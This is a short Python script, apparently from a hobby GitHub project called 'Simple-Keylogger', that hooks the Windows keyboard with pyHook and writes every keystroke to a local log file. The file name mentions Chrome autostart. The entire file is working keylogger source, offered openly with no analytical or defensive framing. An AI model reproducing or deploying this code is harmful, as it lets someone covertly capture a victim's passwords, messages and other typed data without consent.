import pyHook
import pythoncom
import sys
import logging

#keylogger output file destination
file_log = 'C:\\Users\\Keshav Malpani\\Documents\\GitHub\\Simple-Keylogger\\keyloggeroutput-chromeautostart.txt'

#function to acticate keylogger output on every "event" - whenever a key is pressed
def OnKeyboardEvent(event):
    logging.basicConfig(filename=file_log, level=logging.DEBUG, format='%(message)s')
    chr(event.Ascii) #converting ascii to char for redability
    logging.log(10,chr(event.Ascii))
    return True

hooks_manager = pyHook.HookManager()
hooks_manager.KeyDown = OnKeyboardEvent #calling the function with every keypress
hooks_manager.HookKeyboard()
pythoncom.PumpMessages()
